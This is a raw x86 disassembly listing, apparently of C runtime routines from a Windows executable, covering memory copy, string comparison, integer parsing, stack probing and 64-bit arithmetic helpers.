  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
